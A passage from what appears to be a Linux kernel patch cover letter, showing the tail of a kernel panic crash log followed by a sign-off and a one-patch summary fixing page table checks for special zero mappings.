  14:	b2 74                	mov    $0x74,%dl
[ 1513.219761][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
[ 1513.219764][T10795] RSP: 0018:ffa00000172ef708 EFLAGS: 00010286
[ 1513.219767][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1513.219768][T10795]
[ 1513.219771][T10795] RAX: 0000000080000003 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219772][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
[ 1513.219775][T10795] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219776][T10785] PKRU: 55555554
[ 1513.219779][T10795] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219781][T10785] Kernel panic - not syncing: Fatal exception
[ 1514.282927][T10785] Shutting down cpus with NMI
[ 1514.283092][T10785] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  mm/page_table_check: skip special zero mappings

 mm/page_table_check.c | 20 ++++++++++++++++----
 1 file changed, 16 insertions(+), 4 deletions(-)

-- 
2.43.0

